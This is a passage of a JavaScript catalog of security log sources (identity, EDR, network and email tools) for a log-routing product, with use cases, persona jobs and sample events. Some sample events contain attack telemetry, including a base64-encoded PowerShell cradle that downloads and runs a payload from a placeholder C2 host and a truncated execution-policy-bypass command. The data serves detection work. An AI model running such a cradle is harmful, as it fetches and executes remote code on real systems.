            { persona: 'Data Optimizer', job: 'Filter high-volume system.push events and token refresh operations, reducing Okta log volume by 45-60% for SIEM delivery' },
            { persona: 'Data Engineer', job: 'Route authentication failures, policy changes, and admin events to SIEM while sending successful auth events to Lake for usage analytics' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Okta System Log API (Polling) / Okta Log Streaming (AWS EventBridge) / Cribl HTTP Collector (Webhook)',
        sampleEvent: '{"actor":{"id":"00u1a2b3c4d5e6f7g8","type":"User","alternateId":"jperks@cribl.io","displayName":"Jordan Perks"},"client":{"userAgent":{"rawUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)","os":"Windows 10","browser":"CHROME"},"zone":"null","device":"Computer","id":null,"ipAddress":"203.0.113.42","geographicalContext":{"city":"Austin","state":"Texas","country":"United States","geolocation":{"lat":30.2672,"lon":-97.7431}}},"authenticationContext":{"authenticationStep":0,"externalSessionId":"idx1a2b3c4d5"},"displayMessage":"User login to Okta","eventType":"user.session.start","outcome":{"result":"SUCCESS"},"published":"2026-06-06T14:32:01.123Z","severity":"INFO","debugContext":{"debugData":{"requestUri":"/api/v1/authn","dtHash":"abc123","requestId":"req-id-xyz"}},"legacyEventType":"core.user_auth.login_success","transaction":{"type":"WEB","id":"txn-abc-123"},"uuid":"evt-a1b2c3d4-e5f6-7890-abcd-ef1234567890","version":"0","request":{"ipChain":[{"ip":"203.0.113.42","geographicalContext":{"city":"Austin","state":"Texas","country":"United States"}}]},"target":[{"id":"00u1a2b3c4d5e6f7g8","type":"User","alternateId":"jperks@cribl.io","displayName":"Jordan Perks"}]}'
      },
      {
        id: 'microsoft-entra-id',
        name: 'Microsoft Entra ID (Azure AD) Sign-in & Audit Logs',
        vendor: 'Microsoft',
        description: 'Cloud identity sign-in events, conditional access evaluations, risky sign-in detections, service principal authentication, and directory audit changes from Microsoft Entra ID. Covers user and workload identity activity across the Microsoft cloud ecosystem.',
        status: 'available',
        useCases: ['Identity Threat Detection', 'Conditional Access Monitoring', 'Service Principal Security', 'SSO Health', 'License Utilization', 'Compliance Reporting', 'Token Abuse Detection'],
        personas: ['Security Engineering', 'SOC', 'Identity & Access', 'Platform Engineering', 'Compliance'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect risky sign-in patterns including impossible travel, token replay attacks, and MFA fatigue targeting across federated identity providers' },
            { persona: 'Data End User / Analyst', job: 'Investigate conditional access policy bypasses and identify accounts operating outside expected geographic and device baselines' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor SSO authentication latency, token issuance failures, and service principal health across business-critical applications' },
            { persona: 'Data End User / Analyst', job: 'Track conditional access policy effectiveness and identify overly permissive policies allowing risky sign-ins' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter verbose sign-in success events (90%+ of volume) to Lake while routing failures, risky events, and privilege changes to SIEM — reducing ingestion by 60-75%' },
            { persona: 'Data Engineer', job: 'Suppress repetitive non-interactive service principal sign-ins that generate high volume with low security value' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Event Hub or Diagnostic Settings export from Entra ID into Cribl Stream with proper tenant context and schema normalization' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Google Chronicle', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Azure Event Hub / Diagnostic Settings / Microsoft Graph API',
        logFormat: 'JSON — fields include correlationId, userPrincipalName, appDisplayName, ipAddress, location, status, conditionalAccessStatus, riskLevelAggregated, riskState, mfaDetail, deviceDetail, authenticationRequirement.',
        avgEPS: '5,000-50,000 EPS (high volume from non-interactive service principal sign-ins)',
        sampleEvent: '{"time":"2026-06-11T14:32:08Z","resourceId":"/tenants/a1b2c3d4/providers/Microsoft.aadiam","operationName":"Sign-in activity","category":"SignInLogs","properties":{"id":"a1b2c3d4-e5f6-7890-abcd-ef1234567890","createdDateTime":"2026-06-11T14:32:08Z","userDisplayName":"Marcus Thompson","userPrincipalName":"mthompson@cribl.io","userId":"user-guid-001","appId":"app-guid-001","appDisplayName":"Microsoft Teams","ipAddress":"198.51.100.45","location":{"city":"San Francisco","state":"California","countryOrRegion":"US"},"status":{"errorCode":0,"failureReason":""},"conditionalAccessStatus":"success","riskLevelAggregated":"none","riskState":"none","authenticationRequirement":"multiFactorAuthentication","mfaDetail":{"authMethod":"PhoneAppNotification"},"deviceDetail":{"operatingSystem":"MacOS","browser":"Edge 120"}}}'
      },
      {
        id: 'cyberark-pam',
        name: 'CyberArk Privileged Access Manager Audit Logs',
        vendor: 'CyberArk',
        description: 'Privileged session recordings, credential checkout/checkin events, vault access audit trail, and policy violations from CyberArk PAM. Tracks every interaction with privileged credentials including who accessed what, when, and from where.',
        status: 'available',
        useCases: ['Privileged Access Monitoring', 'Credential Abuse Detection', 'Session Recording', 'Compliance Audit', 'Break-glass Tracking', 'Lateral Movement Detection', 'Vendor Access Control'],
        personas: ['Security Engineering', 'SOC', 'Identity & Access', 'Compliance', 'Incident Response'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect anomalous privileged credential usage patterns — off-hours checkouts, unusual target systems, credentials accessed but never checked back in' },
            { persona: 'Data End User / Analyst', job: 'Correlate privileged session activity with endpoint and network events to trace lateral movement using legitimate credentials' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Generate SOX/PCI compliance reports showing all privileged access with full audit trail of who accessed which credentials and for how long' },
            { persona: 'Data End User / Analyst', job: 'Verify dual-control and break-glass procedures were followed for emergency privileged access events' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Route credential health-check and rotation events (high volume, low security value) to Lake while sending actual access events to SIEM — reducing volume by 50-65%' },
            { persona: 'Data Engineer', job: 'Suppress CPM (Central Policy Manager) automated rotation events that constitute bulk of audit volume but have minimal detection value' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure CyberArk SIEM integration (syslog CEF or REST API) and normalize vault/safe/account hierarchy into searchable fields' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (CEF) / REST API / SIEM Integration (Vault Conjur)',
        logFormat: 'CEF or JSON — fields include timestamp, user, safe, target, action (retrieve, checkin, checkout, logon), reason, source_address, session_id, policy_id, severity, vault_name.',
        avgEPS: '500-5,000 EPS (credential rotation events create steady baseline, access events are bursty)',
        sampleEvent: 'CEF:0|CyberArk|Vault|12.6|22|Retrieve password|5|suser=mthompson@cribl.io shost=10.0.1.50 duser=svc_sql_prod dhost=sql-prod-01.internal cs1=Production-DBAs cs2=SQL-Service-Accounts act=Retrieve Password reason=Incident INC0012345 - emergency DB access cs3=safe-prod-dba cs4=2026-06-11T14:32:08Z cs5=session-a1b2c3 cn1=300 cn1Label=SessionDuration'
      }
    ]
  },
  {
    category: 'Endpoint',
    icon: '💻',
    sources: [
      {
        id: 'crowdstrike-edr',
        name: 'CrowdStrike Falcon EDR',
        vendor: 'CrowdStrike',
        description: 'Endpoint detection and response telemetry from CrowdStrike Falcon sensors including process execution (ProcessRollup2), network connections, DNS requests, file writes, user logon events, and detection alerts via the Streaming API or Falcon Data Replicator (FDR).',
        status: 'available',
        useCases: ['LOLBin Detection', 'Process Injection', 'Lateral Movement', 'Credential Dumping', 'Persistence Mechanisms', 'Data Staging', 'Endpoint Health Monitoring', 'Software Inventory', 'Agent Coverage Gaps'],
        personas: ['Security Engineering', 'SOC', 'Endpoint Team', 'Threat Hunting', 'IT Operations'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 10+ detection rules for LOLBin execution, process injection, credential dumping, and persistence mechanisms with MITRE ATT&CK mapping' },
            { persona: 'Data End User / Analyst', job: 'Hunt for lateral movement by correlating ProcessRollup2 events with network connections to identify compromised credentials traversing the network' },
            { persona: 'Jack of All Trades', job: 'Detect data staging and exfiltration by identifying archive tool execution followed by large outbound transfers within 30-minute windows' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume FDR event types (ImageHash, DNS lookups for known-good domains) reducing EDR telemetry by 55-70% for SIEM delivery' },
            { persona: 'Data Engineer', job: 'Route detection alerts and high-fidelity process events to SIEM while sending raw FDR telemetry to Lake for retrospective threat hunting' },
            { persona: 'Team Leader', job: 'Demonstrate FDR optimization ROI with per-event-type volume analysis showing detection coverage maintained at 60%+ cost reduction' }
          ]},
          { category: 'Platform Operations', jobs: [
            { persona: 'Platform Administrator', job: 'Monitor Falcon sensor coverage and identify endpoints with stale check-ins exceeding 72 hours across 10K+ managed devices' },
            { persona: 'Data Onboarder', job: 'Deploy FDR S3 collection with event type filtering and schema mapping to unified endpoint detection schema within 1 hour' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Track software inventory and agent version distribution to identify endpoints requiring updates or with degraded sensor functionality' },
            { persona: 'Data End User / Analyst', job: 'Monitor endpoint health telemetry to detect sensor tampering attempts and resource exhaustion impacting detection capability' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Falcon Data Replicator (FDR via S3) / Streaming API (HTTP) / SIEM Connector',
        sampleEvent: '{"event_simpleName":"ProcessRollup2","timestamp":"1717680000123","aid":"abcdef1234567890abcdef1234567890","ComputerName":"WORKSTATION-01","ImageFileName":"\\\\Device\\\\HarddiskVolume3\\\\Windows\\\\System32\\\\cmd.exe","CommandLine":"cmd.exe /c whoami","ParentBaseFileName":"explorer.exe","UserName":"CORP\\\\jperks","SHA256HashData":"b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874714"}'
      },
      {
        id: 'trellix-hx',
        name: 'Trellix HX (FireEye Endpoint)',
        vendor: 'Trellix (formerly FireEye/Mandiant)',
        description: 'Endpoint detection and response events from Trellix HX (formerly FireEye Endpoint Security). Captures IOC matches, exploit detection, malware execution blocks, real-time indicator matching, containment actions, process timeline data, and acquisition results. Includes alerts from the HX appliance/cloud, triage collections, and enterprise search results.',
        status: 'available',
        useCases: ['IOC Matching', 'Exploit Detection', 'Malware Execution Blocking', 'Endpoint Containment', 'Real-Time Indicator Sweeps', 'Triage Data Collection', 'Threat Intelligence Correlation', 'Lateral Movement Detection', 'Incident Response Automation'],
        personas: ['SOC', 'Security Engineering', 'Incident Response', 'Threat Hunting', 'DFIR', 'Endpoint Team'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 6+ detection rules for IOC matches, exploit detections, and malware execution blocks with automatic MITRE ATT&CK technique correlation' },
            { persona: 'Data End User / Analyst', job: 'Investigate endpoint containment events by correlating HX alerts with process timeline data and acquisition results for root cause analysis' },
            { persona: 'Jack of All Trades', job: 'Detect lateral movement by identifying exploit detections on multiple hosts from the same indicator within 15-minute correlation windows' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter informational IOC sweep results with zero matches and routine agent heartbeats, reducing HX log volume by 45-60% for SIEM' },
            { persona: 'Data Engineer', job: 'Route confirmed exploit detections and malware alerts to SIEM while sending IOC sweep results and triage data to Lake for hunting' },
            { persona: 'Team Leader', job: 'Quantify Trellix HX log optimization savings by comparing alert-only vs full telemetry ingestion costs across endpoint fleet' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor HX agent deployment health and containment status across endpoint fleet to ensure 99%+ coverage with no stale agents beyond 48 hours' },
            { persona: 'Data End User / Analyst', job: 'Track IOC indicator match rates and false positive ratios to optimize threat intelligence feed quality and reduce alert fatigue by 40%' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Trellix HX API collection via REST Collector with alert polling and pagination handling within 30 minutes' },
            { persona: 'Data Engineer', job: 'Normalize Trellix HX alerts into unified endpoint detection schema for cross-EDR correlation with CrowdStrike and Carbon Black events' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Trellix HX API (Cribl REST Collector) / Syslog (CEF) / STIX/TAXII feed / Trellix ePO integration',
        logFormat: 'JSON (API) or CEF (syslog). Alert types: malware-object, exploit-detection, ioc-match, containment, acquisition-completed. Key fields: alert_id, host.hostname, host.ip, indicator.name, indicator.category, matched_source_alerts, resolution.',
        avgEPS: '500-10,000 EPS depending on endpoint fleet and IOC feed size',
        sampleEvent: '{"alert":{"_id":"alert-12345","event_type":"exploit-detection","host":{"hostname":"WORKSTATION-01","ip":"10.1.2.100","os":"Windows 10","agent_version":"35.31.0","containment_state":"normal"},"indicator":{"name":"PROCESS INJECTION - CreateRemoteThread","category":"exploit","severity":"high"},"matched_at":"2026-06-06T14:32:08.000Z","source":"IOC","process_path":"C:\\\\Windows\\\\System32\\\\rundll32.exe","process_id":4521,"parent_process_path":"C:\\\\Windows\\\\explorer.exe","md5":"a1b2c3d4e5f6","resolution":"ALERT","event_values":{"processEvent/process":"rundll32.exe","processEvent/parentProcess":"explorer.exe","processEvent/username":"CORP\\\\jsmith"}}}'
      },
      {
        id: 'trellix-nx',
        name: 'Trellix NX (FireEye Network Security)',
        vendor: 'Trellix (formerly FireEye/Mandiant)',
        description: 'Network security detection events from Trellix NX (formerly FireEye Network Security). Captures multi-vector virtual execution (MVX) analysis results, IPS alerts, lateral movement detections, malware callbacks, zero-day exploit detections, and file analysis verdicts. Provides full packet capture references and MITRE ATT&CK mappings for confirmed threats.',
        status: 'available',
        useCases: ['Zero-Day Exploit Detection', 'Malware C2 Callback Detection', 'Lateral Movement Detection', 'Phishing Payload Analysis', 'Drive-By Download Blocking', 'Encrypted Traffic Anomalies', 'Data Exfiltration Detection', 'Network Forensics', 'IOC Extraction'],
        personas: ['SOC', 'Security Engineering', 'Incident Response', 'Threat Hunting', 'Network Security', 'DFIR'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for zero-day exploits, malware C2 callbacks, drive-by downloads, and encrypted traffic anomalies with MVX verdict correlation' },
            { persona: 'Data End User / Analyst', job: 'Investigate malware callback alerts by correlating NX network detections with endpoint process execution and DNS query patterns' },
            { persona: 'Jack of All Trades', job: 'Detect phishing payload delivery by tracing email attachment verdicts through MVX analysis to identify patient-zero infections within 5 minutes' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter IPS informational events and benign file analysis results, reducing NX alert volume by 50-70% while preserving all confirmed threats' },
            { persona: 'Data Engineer', job: 'Route MVX-confirmed malware alerts and C2 detections to SIEM while sending full IPS telemetry and pcap references to Lake for forensics' },
            { persona: 'Team Leader', job: 'Present NX alert optimization metrics showing SIEM cost reduction with zero impact on mean-time-to-detect for confirmed network threats' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor NX appliance health including MVX engine queue depth and analysis throughput to ensure zero detection gaps during traffic spikes' },
            { persona: 'Data End User / Analyst', job: 'Track detection efficacy metrics by alert type showing true positive rates and IOC extraction success for threat intelligence enrichment' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Trellix NX API collection via REST Collector with alert severity filtering and PCAP reference linking within 30 minutes' },
            { persona: 'Data Engineer', job: 'Normalize Trellix NX network alerts into unified threat detection schema for cross-platform correlation with endpoint and email security events' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Trellix NX API (Cribl REST Collector) / Syslog (CEF) / SMTP notifications / STIX/TAXII export',
        logFormat: 'JSON (API) or CEF (syslog). Alert types: malware-object, malware-callback, domain-match, infection-match, web-infection. Key fields: alert.id, alert.severity, src.ip, dst.ip, malware.name, explanation.cncServices, explanation.osChanges.',
        avgEPS: '100-5,000 EPS depending on network throughput and threat activity',
        sampleEvent: '{"alert":{"id":"nx-alert-67890","name":"Malware.Binary.exe","severity":"MAJR","occurred":"2026-06-06T14:32:08Z","src":{"ip":"10.1.2.100","port":49152,"host":"WORKSTATION-01","mac":"00:1a:2b:3c:4d:5e"},"dst":{"ip":"203.0.113.99","port":443,"host":"malicious-c2-server.xyz"},"malware":{"name":"Trojan.GenericKD.46789","md5":"deadbeef12345678","sha256":"a1b2c3d4e5f67890"},"explanation":{"malwareDetected":{"malware":[{"name":"Trojan.GenericKD.46789","sha256":"a1b2c3d4e5f67890"}]},"cncServices":{"cncService":[{"address":"203.0.113.99","port":"443","protocol":"ssl"}]},"osChanges":[{"type":"file_created","path":"C:\\\\Users\\\\Public\\\\payload.exe"}]},"action":"notified","vlan":100,"interface":"monitor1"}}'
      },
      {
        id: 'carbon-black',
        name: 'VMware Carbon Black EDR / Cloud',
        vendor: 'Broadcom (VMware)',
        description: 'Endpoint detection and response telemetry from VMware Carbon Black (CB EDR and CB Cloud). Captures process execution events, network connections, file modifications, registry changes, cross-process events, binary metadata, watchlist hits, and threat intelligence matches. CB Cloud provides cloud-native endpoint standard and enterprise sensor data via the Platform API and Data Forwarder (S3/Event Hub).',
        status: 'available',
        useCases: ['Process Execution Monitoring', 'Lateral Movement Detection', 'Ransomware Prevention', 'Living-off-the-Land Detection', 'Threat Intelligence Matching', 'Binary Analysis', 'Behavioral Indicators', 'Device Control', 'Vulnerability Assessment', 'Incident Response'],
        personas: ['SOC', 'Security Engineering', 'Threat Hunting', 'Incident Response', 'Endpoint Team', 'DFIR'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 10+ detection rules for process injection, ransomware file modification patterns, and LOLBin execution chains with MITRE ATT&CK mapping' },
            { persona: 'Data End User / Analyst', job: 'Hunt for lateral movement by correlating cross-process events with network connections to identify credential reuse across 50+ endpoints within 5 minutes' },
            { persona: 'Jack of All Trades', job: 'Detect ransomware early by identifying mass file rename/encryption patterns exceeding 100 file modifications per minute from a single process tree' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume binary metadata and module load events, reducing Carbon Black telemetry by 55-70% for SIEM while preserving process execution and alert data' },
            { persona: 'Data Engineer', job: 'Route watchlist hits and threat alerts to SIEM in real time while sending full process/network telemetry to Lake for retrospective threat hunting' },
            { persona: 'Team Leader', job: 'Present per-event-type volume analysis demonstrating 60%+ EDR cost reduction with zero degradation in detection coverage metrics' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Carbon Black sensor health and identify endpoints with stale check-ins exceeding 48 hours across the managed fleet' },
            { persona: 'Data End User / Analyst', job: 'Track process execution baselines per endpoint role to detect behavioral anomalies indicating compromised hosts or unauthorized software' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure CB Cloud Data Forwarder S3 collection with event type filtering and deliver parsed events to SIEM + Lake within 45 minutes' },
            { persona: 'Data Engineer', job: 'Normalize Carbon Black process events into unified endpoint schema for cross-EDR correlation with CrowdStrike and Trellix HX telemetry' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'CB Cloud Data Forwarder (S3/Azure Event Hub) / CB EDR Event Forwarder (Syslog/JSON) / Platform API (Cribl REST Collector) / SIEM Connector',
        logFormat: 'JSON (Data Forwarder and API). Event types: endpoint.event.procstart, endpoint.event.netconn, endpoint.event.filemod, endpoint.event.regmod, endpoint.event.crossproc, endpoint.event.modload, alert. Key fields: process_name, process_hash, process_cmdline, parent_name, parent_hash, device_name, device_os, event_type, alert_severity.',
        avgEPS: '5,000-100,000 EPS depending on endpoint fleet size and sensor verbosity',
        sampleEvent: '{"type":"endpoint.event.procstart","event_timestamp":"2026-06-09T14:32:08.000Z","device_id":"12345678","device_name":"WORKSTATION-01","device_os":"WINDOWS","device_os_version":"Windows 10 x64","org_key":"ABCD1234","process_guid":"ABCD1234-0000abcd-00001234-00000000-1d8a0b0c0d0e0f00","process_name":"cmd.exe","process_hash":["b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874714"],"process_cmdline":"cmd.exe /c powershell -ep bypass -enc SQBFAFgA...","process_username":"CORP\\\\jsmith","process_pid":4521,"parent_guid":"ABCD1234-0000abcd-00001230-00000000-1d8a0b0c0d0e0f00","parent_name":"explorer.exe","parent_hash":["a1b2c3d4e5f67890"],"parent_pid":2100,"childproc_type":"CHILD","crossproc_type":"","alert_id":[],"ttp":["MITRE_T1059.001"]}'
      },
      {
        id: 'microsoft-defender-endpoint',
        name: 'Microsoft Defender for Endpoint (MDE)',
        vendor: 'Microsoft',
        description: 'Enterprise endpoint detection and response logs from Microsoft Defender for Endpoint covering alerts, device events, advanced hunting telemetry, vulnerability assessments, and automated investigation results. Integrated with Microsoft 365 Defender.',
        status: 'available',
        useCases: ['Endpoint Threat Detection', 'Vulnerability Management', 'Automated Investigation', 'Threat Hunting', 'Device Compliance', 'Incident Response', 'Attack Surface Reduction'],
        personas: ['SOC', 'Security Engineering', 'Incident Response', 'Threat Hunting', 'Endpoint Security'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Enrich MDE alerts with network context and correlate across endpoint, identity, and email telemetry for composite detections' },
            { persona: 'Data End User / Analyst', job: 'Investigate MDE alerts using advanced hunting data including process trees, network connections, and file modifications' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume device telemetry events (registry reads, benign process creation) reducing MDE volume by 60-75% while preserving alerts and suspicious activity' },
            { persona: 'Data Engineer', job: 'Route MDE alerts and high-severity events to SIEM while sending raw device telemetry to Lake for threat hunting queries' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor MDE sensor health, onboarding status, and detection coverage gaps across the device fleet' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Microsoft 365 Defender streaming API to Event Hub and connect to Cribl Stream for multi-destination routing' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Microsoft Sentinel', 'CrowdStrike NG SIEM', 'Splunk', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Microsoft 365 Defender Streaming API → Event Hub / REST API (Advanced Hunting) / SIEM Agent',
        logFormat: 'JSON — tables include AlertInfo, AlertEvidence, DeviceProcessEvents, DeviceNetworkEvents, DeviceFileEvents, DeviceRegistryEvents, DeviceLogonEvents. Key fields: Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine, RemoteIP.',
        avgEPS: '10,000-500,000 EPS depending on device count and telemetry level (basic vs advanced)',
        sampleEvent: '{"Timestamp":"2026-06-11T14:32:08Z","DeviceId":"abc123def456","DeviceName":"DESKTOP-JP01","ActionType":"ProcessCreated","FileName":"powershell.exe","FolderPath":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0","ProcessCommandLine":"powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\\\Scripts\\\\backup.ps1","InitiatingProcessFileName":"explorer.exe","AccountName":"jperks","AccountDomain":"CORP","RemoteIP":"","RemotePort":0,"AlertId":"","ThreatFamily":""}'
      },
      {
        id: 'sentinelone-edr',
        name: 'SentinelOne Singularity EDR',
        vendor: 'SentinelOne',
        description: 'Autonomous endpoint detection and response telemetry from SentinelOne Singularity platform. Captures Deep Visibility process events, file operations, network connections, registry modifications, DNS queries, login events, and threat detections with automated response actions (kill, quarantine, rollback). Includes Storyline technology linking related events into attack narratives.',
        status: 'available',
        useCases: ['Autonomous Threat Detection', 'Ransomware Rollback', 'Behavioral AI Detection', 'Process Execution Monitoring', 'Lateral Movement Detection', 'Fileless Attack Detection', 'Device Control', 'Rogue Device Discovery', 'Threat Hunting', 'Incident Response'],
        personas: ['SOC', 'Security Engineering', 'Threat Hunting', 'Incident Response', 'Endpoint Team', 'IT Operations'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build cross-platform detections correlating SentinelOne Deep Visibility events with network and identity telemetry — process execution chains, lateral movement via remote process creation, and credential access patterns mapped to MITRE ATT&CK' },
            { persona: 'Data End User / Analyst', job: 'Hunt for fileless attacks by analyzing PowerShell, WMI, and .NET in-memory execution events from Deep Visibility, correlating with SentinelOne Storyline IDs to reconstruct full attack chains within 10 minutes' },
            { persona: 'Jack of All Trades', job: 'Detect ransomware pre-encryption behavior by identifying mass file enumeration, shadow copy deletion, and encryption library loading patterns before file modification begins' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor SentinelOne agent health, policy compliance, and update status across the fleet — identify endpoints with stale signatures or disconnected agents exceeding 24 hours' },
            { persona: 'Data End User / Analyst', job: 'Track application inventory and software vulnerabilities detected by Singularity Ranger for asset management and patch prioritization' },
            { persona: 'NOC', job: 'Detect rogue devices on the network via Ranger discovery events and correlate with authenticated device inventory for unauthorized asset alerting' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume Deep Visibility events (module loads, benign registry reads, DNS lookups to known-good domains) reducing SentinelOne telemetry by 60-80% while preserving all threats, suspicious activity, and process execution chains' },
            { persona: 'Data Engineer', job: 'Route SentinelOne threat detections and high-confidence behavioral indicators to SIEM for real-time alerting while streaming full Deep Visibility telemetry to Lake for retrospective threat hunting at storage-tier cost' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure SentinelOne Singularity Data Lake export via Cloud Funnel 2.0 (S3/Azure Blob) or Streaming API (HTTP POST) to Cribl Stream with event-type filtering within 30 minutes' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3', 'Google Chronicle'],
        collectionMethod: 'Cloud Funnel 2.0 (S3/Azure Blob) / Streaming API (HTTP POST) / SIEM Connector / REST API (Cribl REST Collector)',
        logFormat: 'JSON (Cloud Funnel NDJSON). Key event types: process, file, network, registry, dns, login, indicator, threat. Fields include: trueContext (Storyline), src.process.name, src.process.cmdline, src.process.user, endpoint.name, endpoint.os, event.type, event.category, threat.classification, threat.mitreTechnique, indicator.category.',
        avgEPS: '10,000-500,000 EPS depending on endpoint count and Deep Visibility telemetry depth',
        sampleEvent: '{"timestamp":"2026-06-17T14:32:08.000Z","event.type":"Process Creation","event.category":"process","endpoint.name":"WORKSTATION-JP01","endpoint.os":"windows","src.process.name":"powershell.exe","src.process.cmdline":"powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AYwAyAC4AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA","src.process.pid":4521,"src.process.user":"CORP\\\\jsmith","src.process.parent.name":"explorer.exe","src.process.parent.pid":2100,"src.process.storyline.id":"A1B2C3D4E5F6","src.process.integrityLevel":"MEDIUM","threat.classification":"Malware","threat.confidenceLevel":"malicious","threat.mitreTechnique":["T1059.001","T1105"],"threat.analystVerdict":"true_positive","activeResponse.action":"kill","site.name":"Corporate-Prod","group.name":"Engineering"}'
      }
    ]
  },
  {
    category: 'Email Security',
    icon: '📧',
    sources: [
      {
        id: 'cisco-secure-email',
        name: 'Cisco Secure Email Gateway (IronPort)',
        vendor: 'Cisco',
        description: 'Email security event logs from Cisco Secure Email Gateway (formerly IronPort/ESA). Captures message tracking events, anti-spam verdicts (IPAS/CASE), antivirus results, Advanced Malware Protection (AMP) file analysis, DLP policy matches, content filter actions, sender reputation scores (SenderBase/Talos), DKIM/SPF/DMARC authentication results, and URL filtering verdicts from outbreak filters.',
        status: 'available',
        useCases: ['Phishing Detection', 'Business Email Compromise', 'Malware Delivery Blocking', 'Data Loss Prevention', 'Spam Volume Monitoring', 'Sender Reputation Analysis', 'URL Rewriting Effectiveness', 'Outbreak Filter Performance', 'Quarantine Management', 'Email Authentication Failures'],
        personas: ['SOC', 'Security Engineering', 'Email Administration', 'Compliance', 'Incident Response', 'Data Protection'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
